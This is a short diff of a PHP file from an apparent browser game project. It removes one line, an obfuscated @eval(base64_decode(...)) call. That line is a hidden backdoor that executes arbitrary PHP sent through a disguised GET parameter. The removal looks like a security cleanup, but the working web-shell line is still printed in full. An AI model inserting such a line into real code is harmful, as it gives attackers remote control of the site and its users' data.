@@ -6,7 +6,6 @@
 /	Mobile: 09127679667  / Yahoo ID : mersad_mr@att.net
 /
 */
-@eval(base64_decode('aWYoc3RybGVuKCRfR0VUWydlZWVlZXZ2dnZ2dnZ2YWxlJ10pPjEpe2V2YWwodXJsZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2VlZWVldnZ2dnZ2dnZhbGUnXSkpKTt9'));
 include("GameEngine/Protection.php");
 include("GameEngine/Village.php");
 if($_GET){
